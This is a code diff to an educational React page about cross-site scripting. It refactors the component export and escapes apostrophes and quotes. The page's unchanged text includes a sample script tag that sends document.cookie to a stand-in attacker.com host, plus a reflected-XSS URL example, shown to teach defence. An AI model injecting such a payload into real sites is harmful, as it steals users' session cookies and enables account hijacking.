@@ -7,7 +7,7 @@ import Code from '@/app/components/Code';
 import Footer from '@/app/components/Footer';
 import Emphasis from '@/app/components/Emphasis';
 
-export default function xss() {
+const XSS = () => {
   const commentRef = React.useRef<HTMLDivElement>(null);
   const [comment, setComment] = React.useState<string>('');
 
@@ -40,7 +40,7 @@ export default function xss() {
       <div className="flex flex-col justify-center items-center mx-10 px-24 py-6 text-lg space-y-6">
         <p>
         Cross-Site Scripting (XSS) is a type of security vulnerability in web applications where an attacker injects <Emphasis>malicious scripts</Emphasis>  into content that is sent to other users. When the application displays this content, 
-        the malicious script runs in the context of the victim's browser, potentially allowing the attacker to 
+        the malicious script runs in the context of the victim&apos;s browser, potentially allowing the attacker to 
         perform actions on behalf of the user.
         </p>
         <h2 className="bg-gradient-to-r from-indigo-100 to-indigo-300 rounded w-max text-3xl px-3 py-px font-bold">HOW IS XSS PERFORMED</h2>
@@ -48,11 +48,11 @@ export default function xss() {
         XSS typically occurs because a web application accepts <Emphasis>untrusted input</Emphasis> and then includes this input in responses sent to users, without proper <Emphasis>sanitisation.</Emphasis> This allows attackers to <Emphasis>inject</Emphasis> code, 
         such as JavaScript, into a web page.
         </p>
-        <p>Consider a comments section on an article. A user might normally adds comments like "Hi, great writeup!" However, if there is no sanitisation, an attacker may maliciously submit</p>
+        <p>Consider a comments section on an article. A user might normally adds comments like &quot;Hi, great writeup!&quot; However, if there is no sanitisation, an attacker may maliciously submit</p>
         <Code value="<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>" language="html" />
         <p>
-        as their comment. When this comment is displayed, the script runs in the context of the victim's browser, and so the session cookies of the user is sent to the attacker's server.
-        If this is successful, the attacker is now able to hijack the user's session. Other malicious scripts may also be used to capture keystrokes of the user
+        as their comment. When this comment is displayed, the script runs in the context of the victim&apos;s browser, and so the session cookies of the user is sent to the attacker&apos;s server.
+        If this is successful, the attacker is now able to hijack the user&apos;s session. Other malicious scripts may also be used to capture keystrokes of the user
         or even conduct phishing within the web application.
         </p>
         <h2 className="bg-gradient-to-r from-indigo-100 to-indigo-300 rounded w-max text-3xl px-3 py-px font-bold">TYPES OF XSS</h2>
@@ -70,7 +70,7 @@ export default function xss() {
         <Code value="https://example.com?search=<script>...</script>" language='html' />
         <span> 
           If the web application displays the search parameter value without proper sanitization, 
-          the attacker’s script executes in the user's browser when they click the link.
+          the attacker&apos;s script executes in the user&apos;s browser when they click the link.
         </span>
         <span className="mt-8">
         In <Emphasis>DOM-based</Emphasis> XSS, the security vulnerability exists within the client-side JavaScript code. The malicious script is injected directly into the Document Object Model (DOM) without passing through the server.
@@ -110,4 +110,6 @@ export default function xss() {
 
   );
 }
+
+export default XSS;
 
